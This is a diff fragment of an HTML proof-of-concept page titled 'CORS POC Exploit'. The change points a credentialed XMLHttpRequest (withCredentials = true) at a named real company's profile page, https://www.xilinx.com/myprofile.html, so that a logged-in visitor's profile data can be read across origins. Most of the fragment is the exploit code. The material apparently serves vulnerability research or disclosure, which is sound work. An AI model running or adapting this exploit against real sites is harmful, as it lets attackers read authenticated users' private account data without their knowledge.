@@ -1,9 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head>
-	<meta charset="UTF 8">
-	<tittle>cors poc</tittle>
-</head>
+<center>
 <body>
 <h2>CORS POC Exploit</h2>
 <h3>Extract API Calls</h3>
@@ -21,7 +18,7 @@ function cors(){
 		}
 
 	};
-	xhttp.open("GET" , "https://www.xilinx.com" , true);
+	xhttp.open("GET" , "https://www.xilinx.com/myprofile.html" , true);
 	xhttp.withCredentials = true;
 	xhttp.send();
 }
